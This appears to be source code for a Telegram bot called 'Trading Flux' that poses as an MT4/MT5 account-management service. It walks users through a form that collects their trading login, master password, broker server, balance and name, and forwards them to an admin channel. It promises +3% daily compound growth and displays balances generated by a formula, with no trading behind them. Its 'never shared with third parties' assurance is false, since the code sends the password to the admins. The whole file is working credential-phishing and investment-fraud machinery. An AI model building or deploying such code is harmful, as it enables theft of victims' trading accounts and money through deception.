import { Bot, Context, InlineKeyboard, NextFunction } from "grammy";
import { getSession, updateSession, setStep, resetSession } from "../sessions";
import { buildAdminMessage, buildConfirmationMessage, buildFormPreview } from "../utils/format";
import { savePending } from "../pending";
import { handleDepositTextInput } from "./deposit";
import { handleSupportTextInput, handleUserReplyToSupport, setSupportStep, clearSupportStep } from "./support";
import { Redis } from "@upstash/redis";
import { AccountData, computeBalance, formatUSD } from "../utils/balance";
import { isPending } from "../pending";

function r(): Redis {
  return new Redis({
    url: process.env.UPSTASH_REDIS_REST_URL!,
    token: process.env.UPSTASH_REDIS_REST_TOKEN!,
  });
}

async function getAccountData(userId: number): Promise<AccountData | null> {
  const raw = await r().get<AccountData>(`acct:${userId}`);
  if (!raw) return null;
  return { ...raw, startDate: new Date(raw.startDate as unknown as string) };
}

const LOGO = `
┌─────────────────────────┐
│    📊  TRADING FLUX      │
│  Professional Account   │
│     Management          │
└─────────────────────────┘`;

function stepHeader(step: number, total: number, title: string): string {
  const filled = "●".repeat(step);
  const empty = "○".repeat(total - step);
  return `*${title}*\nProgress: ${filled}${empty}  [${step}/${total}]\n${"─".repeat(28)}`;
}

function mainMenuKeyboard(): InlineKeyboard {
  return new InlineKeyboard()
    .text("📊 My Balance", "menu_balance").row()
    .text("📝 Register Account", "menu_register").row()
    .text("💰 Deposit", "menu_deposit")
    .text("💳 Pay Fee ($3)", "menu_fee").row()
    .text("❓ How It Works", "menu_howitworks")
    .text("💬 Support", "menu_support").row()
    .text("📋 My Status", "menu_status");
}

function cancelKeyboard(): InlineKeyboard {
  return new InlineKeyboard().text("❌ Cancel Form", "form_cancel");
}

async function sendMainMenu(ctx: Context, firstName?: string) {
  const greeting = firstName ? `Welcome back, *${firstName}*! 👋` : `Welcome to *Trading Flux*! 👋`;

  let balanceLine = "";
  if (ctx.from?.id) {
    const account = await getAccountData(ctx.from.id);
    if (account) {
      const daysElapsed = Math.max(0, Math.floor((Date.now() - account.startDate.getTime()) / 86_400_000));
      const currentBalance = computeBalance(account.deposit, daysElapsed);
      balanceLine =
        `\n┌─────────────────────────┐\n` +
        `│  💰 Your Balance          │\n` +
        `│  *${formatUSD(currentBalance).padEnd(24)}*│\n` +
        `│  📥 Deposit: ${formatUSD(account.deposit).padEnd(13)}│\n` +
        `└─────────────────────────┘\n`;
    }
  }

  await ctx.reply(
    `${LOGO}\n\n${greeting}\n` +
    balanceLine +
    `\n🚀 *Your Professional MT4/MT5 Account Manager*\n\n` +
    `✅  +3% daily compound growth\n` +
    `✅  Managed by expert traders\n` +
    `✅  Real-time balance tracking\n` +
    `✅  Secure & transparent\n\n` +
    `${"─".repeat(28)}\nWhat would you like to do?`,
    { parse_mode: "Markdown", reply_markup: mainMenuKeyboard() }
  );
}

export function registerFormHandlers(bot: Bot<Context>): void {

  bot.command("start", async (ctx) => {
    await resetSession(ctx.from!.id);
    await sendMainMenu(ctx, ctx.from?.first_name);
  });

  bot.command("help", async (ctx) => {
    await ctx.reply(
      `*📖 Trading Flux — Help Centre*\n${"─".repeat(28)}\n\n` +
      `*Commands:*\n▸ /start — Main menu\n▸ /register — Submit account\n▸ /cancel — Exit current form\n▸ /help — This menu\n\n` +
      `*How Account Management Works:*\n① Submit your MT4/MT5 credentials\n② Our team reviews within 24 hours\n③ We activate your account\n④ Your balance grows +3%/day\n\n` +
      `${"─".repeat(28)}\n💡 Tip: Use the buttons for the best experience.`,
      { parse_mode: "Markdown", reply_markup: new InlineKeyboard().text("📝 Register Now", "menu_register").row().text("🏠 Main Menu", "menu_main") }
    );
  });

  bot.command("cancel", async (ctx) => {
    await resetSession(ctx.from!.id);
    await clearSupportStep(ctx.from!.id);
    await ctx.reply(`✅ *Form cancelled.*\n\nReturning you to the main menu.`, { parse_mode: "Markdown", reply_markup: mainMenuKeyboard() });
  });

  bot.command("register", async (ctx) => {
    await resetSession(ctx.from!.id);
    await setStep(ctx.from!.id, "platform");
    await askPlatform(ctx);
  });

  bot.callbackQuery("menu_main", async (ctx) => {
    await ctx.answerCallbackQuery();
    await resetSession(ctx.from!.id);
    await clearSupportStep(ctx.from!.id);
    await sendMainMenu(ctx, ctx.from?.first_name);
  });

  bot.callbackQuery("menu_register", async (ctx) => {
    await ctx.answerCallbackQuery();
    await resetSession(ctx.from!.id);
    await setStep(ctx.from!.id, "platform");
    await askPlatform(ctx);
  });

  bot.callbackQuery("menu_howitworks", async (ctx) => {
    await ctx.answerCallbackQuery();
    await ctx.reply(
      `*📈 How Trading Flux Works*\n${"─".repeat(28)}\n\n` +
      `*Step 1 — Submit Your Account*\nProvide your MT4/MT5 login credentials securely through our guided form.\n\n` +
      `*Step 2 — Expert Review (24h)*\nOur team verifies your account details and sets up management.\n\n` +
      `*Step 3 — Activation*\nWe activate trading on your account with our proven strategy.\n\n` +
      `*Step 4 — Daily Growth*\nYour balance grows at +3% per day using compound interest.\n\n` +
      `*Step 5 — Daily Updates*\nYou'll receive regular updates on your account performance.\n\n` +
      `${"─".repeat(28)}\n💰 *Example: $1,000 deposit*\n  Day 7:   \\$1,229.87\n  Day 30:  \\$2,427.26\n  Day 90:  \\$14,300.74`,
      { parse_mode: "Markdown", reply_markup: new InlineKeyboard().text("📝 Register Now", "menu_register").row().text("🏠 Main Menu", "menu_main") }
    );
  });

  bot.callbackQuery("menu_support", async (ctx) => {
    await ctx.answerCallbackQuery();
    await setSupportStep(ctx.from!.id);
    await ctx.reply(
      `*💬 Contact Support*\n${"─".repeat(28)}\n\n` +
      `Our support team is available 24/7 and will reply to you directly here in this chat.\n\n` +
      `📝 *Describe your issue or question:*\n\n` +
      `_Type your message below and tap Send._`,
      {
        parse_mode: "Markdown",
        reply_markup: new InlineKeyboard().text("❌ Cancel", "support_cancel"),
      }
    );
  });

  bot.callbackQuery("support_cancel", async (ctx) => {
    await ctx.answerCallbackQuery("Cancelled");
    await clearSupportStep(ctx.from!.id);
    await ctx.reply(`✅ *Cancelled.*`, { parse_mode: "Markdown", reply_markup: mainMenuKeyboard() });
  });

  bot.callbackQuery("menu_status", async (ctx) => {
    await ctx.answerCallbackQuery();
    const userId = ctx.from!.id;
    const account = await getAccountData(userId);

    if (account) {
      const msPerDay = 86_400_000;
      const daysElapsed = Math.max(0, Math.floor((Date.now() - account.startDate.getTime()) / msPerDay));
      const currentBalance = computeBalance(account.deposit, daysElapsed);
      const totalProfit = currentBalance - account.deposit;
      const growthPct = account.deposit > 0 ? ((currentBalance - account.deposit) / account.deposit) * 100 : 0;

      await ctx.reply(
        `*📋 Your Account Status*\n${"─".repeat(28)}\n\n` +
        `👤 *${account.fullName}*\n` +
        `📌 Status: *🟢 Active*\n\n` +
        `${"━".repeat(28)}\n` +
        `💵 *BALANCE SUMMARY*\n\n` +
        `  💰 Current Balance:  *${formatUSD(currentBalance)}*\n` +
        `  📥 Your Deposit:     *${formatUSD(account.deposit)}*\n` +
        `  📈 Total Profit:     *+${formatUSD(totalProfit)}*\n` +
        `  🚀 Growth:           *+${growthPct.toFixed(2)}%*\n\n` +
        `${"━".repeat(28)}\n` +
        `🖥️ *${account.platform ?? "—"}*\n` +
        `📅 Active for *${daysElapsed} day${daysElapsed !== 1 ? "s" : ""}*  ·  +3%/day`,
        {
          parse_mode: "Markdown",
          reply_markup: new InlineKeyboard()
            .text("📊 Full Dashboard", "menu_balance").row()
            .text("💰 Deposit More", "menu_deposit")
            .text("🏠 Main Menu", "menu_main"),
        }
      );
      return;
    }

    if (await isPending(userId)) {
      await ctx.reply(
        `*📋 Your Account Status*\n${"─".repeat(28)}\n\n` +
        `📌 Status: *⏳ Under Review*\n\n` +
        `Your submission is being reviewed by our team.\n` +
        `You'll be notified within 24 hours once approved.`,
        { parse_mode: "Markdown", reply_markup: new InlineKeyboard().text("🏠 Main Menu", "menu_main") }
      );
      return;
    }

    await ctx.reply(
      `*📋 Your Account Status*\n${"─".repeat(28)}\n\n` +
      `📌 Status: *⚪ Not Registered Yet*\n\n` +
      `Complete the registration form to submit your MT4/MT5 account for management.`,
      { parse_mode: "Markdown", reply_markup: new InlineKeyboard().text("📝 Register Now", "menu_register").row().text("🏠 Main Menu", "menu_main") }
    );
  });

  bot.callbackQuery("form_cancel", async (ctx) => {
    await ctx.answerCallbackQuery("Cancelled");
    await resetSession(ctx.from!.id);
    await ctx.reply(`✅ *Form cancelled.*\n\nNo data was submitted.`, { parse_mode: "Markdown", reply_markup: mainMenuKeyboard() });
  });

  bot.callbackQuery(/^platform_(MT4|MT5)$/, async (ctx) => {
    await ctx.answerCallbackQuery();
    const platform = ctx.match[1] as "MT4" | "MT5";
    await updateSession(ctx.from!.id, { platform, step: "account_number" });
    await ctx.reply(
      stepHeader(2, 6, "🔢 Login / Account Number") + `\n\n✅ Platform: *${platform}*\n\nEnter your MT4/MT5 *login (account number)*:\n_The numeric ID you use to log in._`,
      { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
    );
  });

  bot.callbackQuery("submit_confirm", async (ctx) => {
    await ctx.answerCallbackQuery("⏳ Submitting...");
    const userId = ctx.from!.id;
    const session = await getSession(userId);

    await savePending(userId, session, ctx.from.username);

    try {
      await ctx.api.sendMessage(
        process.env.ADMIN_CHANNEL_ID!,
        buildAdminMessage(session, userId, ctx.from.username),
        {
          parse_mode: "HTML",
          reply_markup: new InlineKeyboard()
            .text("✅ Approve", `approve_${userId}`)
            .text("❌ Reject", `reject_${userId}`),
        }
      );
    } catch (e) {
      console.error("Admin channel error:", e);
    }

    await resetSession(userId);
    await ctx.reply(buildConfirmationMessage(session), {
      parse_mode: "Markdown",
      reply_markup: new InlineKeyboard().text("🏠 Main Menu", "menu_main"),
    });
  });

  bot.callbackQuery("submit_cancel", async (ctx) => {
    await ctx.answerCallbackQuery("Cancelled");
    await resetSession(ctx.from!.id);
    await ctx.reply(`❌ *Submission cancelled.*\n\nYour data was not saved.`, { parse_mode: "Markdown", reply_markup: mainMenuKeyboard() });
  });

  bot.on("message:text", async (ctx, next: NextFunction) => {
    if (
      process.env.ADMIN_CHANNEL_ID &&
      ctx.chat.id.toString() === process.env.ADMIN_CHANNEL_ID
    ) {
      await next();
      return;
    }

    const userId = ctx.from!.id;
    const text = ctx.message.text.trim();
    if (text.startsWith("/")) return;

    // Check if user is replying directly to a support message from admin
    const handledByUserReply = await handleUserReplyToSupport(ctx);
    if (handledByUserReply) return;

    // Check if user is composing a new support request
    const handledBySupport = await handleSupportTextInput(ctx);
    if (handledBySupport) return;

    const handledByDeposit = await handleDepositTextInput(ctx);
    if (handledByDeposit) return;

    const session = await getSession(userId);

    switch (session.step) {
      case "account_number": {
        if (!/^\d+$/.test(text)) {
          await ctx.reply(`⚠️ *Invalid format*\n\nAccount number must contain digits only.\nPlease try again:`, { parse_mode: "Markdown", reply_markup: cancelKeyboard() });
          return;
        }
        await updateSession(userId, { accountNumber: text, step: "password" });
        await ctx.reply(
          stepHeader(3, 6, "🔑 Master Password") + `\n\n✅ Login: \`${text}\`\n\nEnter your account's *master password*:\n\n🔒 _Transmitted securely. Never shared with third parties._`,
          { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
        );
        break;
      }
      case "password": {
        await updateSession(userId, { password: text, step: "server_name" });
        await ctx.reply(
          stepHeader(4, 6, "🌐 Broker Server Name") + `\n\n✅ Password saved.\n\nEnter your broker's *server name*:\n\n_Found on your MT4/MT5 login screen._\n_e.g._ \`ICMarkets-Live01\``,
          { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
        );
        break;
      }
      case "server_name": {
        await updateSession(userId, { serverName: text, step: "deposit" });
        await ctx.reply(
          stepHeader(5, 6, "💵 Account Balance") + `\n\n✅ Server: \`${text}\`\n\nWhat is your current account balance in *USD*?\n\n_Enter numbers only (e.g._ \`5000\`_)_`,
          { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
        );
        break;
      }
      case "deposit": {
        const amount = parseFloat(text.replace(/[^0-9.]/g, ""));
        if (isNaN(amount) || amount <= 0) {
          await ctx.reply(`⚠️ *Invalid amount*\n\nPlease enter a valid USD amount (e.g. \`1000\`):`, { parse_mode: "Markdown", reply_markup: cancelKeyboard() });
          return;
        }
        await updateSession(userId, { depositAmount: amount.toFixed(2), step: "full_name" });
        await ctx.reply(
          stepHeader(6, 6, "👤 Full Name") + `\n\n✅ Deposit: *$${amount.toLocaleString("en-US", { minimumFractionDigits: 2 })}*\n\nEnter your *full name*:`,
          { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
        );
        break;
      }
      case "full_name": {
        if (text.length < 3) {
          await ctx.reply(`⚠️ Please enter your full name (at least 3 characters):`, { reply_markup: cancelKeyboard() });
          return;
        }
        const today = new Date().toISOString().split("T")[0];
        await updateSession(userId, { fullName: text, startDate: today, step: "confirm" });
        const updatedSession = await getSession(userId);
        await ctx.reply(buildFormPreview(updatedSession), {
          parse_mode: "Markdown",
          reply_markup: new InlineKeyboard()
            .text("✅ Confirm & Submit", "submit_confirm").row()
            .text("✏️ Edit (start over)", "menu_register")
            .text("❌ Cancel", "submit_cancel"),
        });
        break;
      }
      case "idle": {
        await ctx.reply(`👋 Use the menu below to get started.`, { reply_markup: mainMenuKeyboard() });
        break;
      }
    }
  });
}

async function askPlatform(ctx: Context) {
  await ctx.reply(
    stepHeader(1, 6, "🖥️ Trading Platform") + `\n\nSelect your trading platform:`,
    {
      parse_mode: "Markdown",
      reply_markup: new InlineKeyboard()
        .text("📊 MetaTrader 4  (MT4)", "platform_MT4").row()
        .text("📈 MetaTrader 5  (MT5)", "platform_MT5").row()
        .text("❌ Cancel", "form_cancel"),
    }
  );
}
